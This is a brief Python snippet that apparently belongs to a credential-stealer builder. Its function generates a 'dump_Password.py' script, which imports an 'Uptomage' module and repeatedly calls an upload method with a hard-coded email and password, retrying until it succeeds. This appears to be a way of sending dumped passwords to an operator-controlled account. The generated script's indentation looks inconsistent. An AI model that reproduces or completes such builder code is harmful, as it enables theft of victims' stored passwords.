def build_pass(email, Password):
	with open("dump_Password.py","w+") as file:
		file.write("from Uptomage import upToMaGePAS\n")
		file.write("from time import sleep\n")
		file.write("""
def run():
	if __name__ == "__main__":
		while 1:
			try:
	""")
		file.write(""" 
				PassW = upToMaGePAS()
				""")
		file.write(""+"PassW.up("+"'"+email + "'" +"," + "'" + Password +"'" + ")" + "\n")
		file.write("				"+"break")
		file.write("""
			except Exception:
				sleep(20)
	""")
		file.write(""" 
run()
	""")
		file.close()
